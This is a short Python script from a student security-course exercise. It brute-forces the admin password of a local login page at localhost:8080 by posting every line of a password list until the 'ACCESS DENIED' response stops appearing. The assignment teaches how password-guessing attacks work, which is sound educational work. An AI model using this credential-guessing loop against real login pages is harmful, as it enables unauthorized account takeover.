# Dylan Ramdhan, CS 357
# Login Authentification: Challenge 1.0

#import requests # using requests library, used for HTTP stuff
import requests


    ### Opening the File ###
# inserting the LOCALHOST:8080 url
url = "http://localhost:8080/login"

# Opening the file
file = open('passwords.txt', 'r')


# Reading the File and Spliting the Lines
lines = file.read().splitlines()
password = ''

# Using FOR LOOPS to iterate through every Password trial
for ii in lines:
    data = {
        'username': 'admin', 
        'password': ii
        }
    
    # Inputting Every Line
    r = requests.post(url, data = data)
    
    # Break script if Access was Sucessful
    if 'ACCESS DENIED' not in r.text:
        password = ii
        break

# Printing Out the Password
print(password)